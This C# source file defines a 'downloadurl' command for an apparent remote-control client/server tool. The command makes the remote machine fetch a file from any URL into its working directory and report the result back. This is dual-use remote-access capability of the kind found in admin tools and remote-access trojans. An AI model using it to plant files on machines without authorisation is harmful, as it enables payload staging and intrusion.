using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using NetworkManager;
using Shared;

namespace Commands
{
    internal class DownloadUrl : ICommand
    {
        public string name { get; } = "downloadurl";

        public string description { get; } = "Make the server download a file from the specified url";

        public string syntaxHelper { get; } = "downloadurl [url]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>()
            {
                typeof(string)
            }
        };

        public List<string> clientFlags { get; } = new List<string>()
        {
            "{DownloadUrl:init}"
        };

        public List<string> savedData { get; set; }


        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            ColorTools.WriteCommandMessage("Starting download of file from url");

            var result = GlobalNetworkManager.ReadLine();
            if (result == "Success")
            {
                ColorTools.WriteCommandSuccess("File downloaded successfully from URL");
            }
            else
            {
                var error = result.Split(':')[1];
                ColorTools.WriteCommandError($"Download failed : {(error == "IO" ? "IO exception" : "Network error")}");
            }
        }

        public void ServerMethod(List<string> args)
        {
            GlobalNetworkManager.WriteLine(clientFlags[0]);

            var url = args[0];
            var newFile = url.Split('/').Last();

            var Client = new WebClient();
            try
            {
                Client.DownloadFile(url, newFile);
                GlobalNetworkManager.WriteLine("Success");
            }
            catch (IOException)
            {
                GlobalNetworkManager.WriteLine("Error:IO");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(newFile);
                GlobalNetworkManager.WriteLine("Error:Web");
            }
        }
    }
}
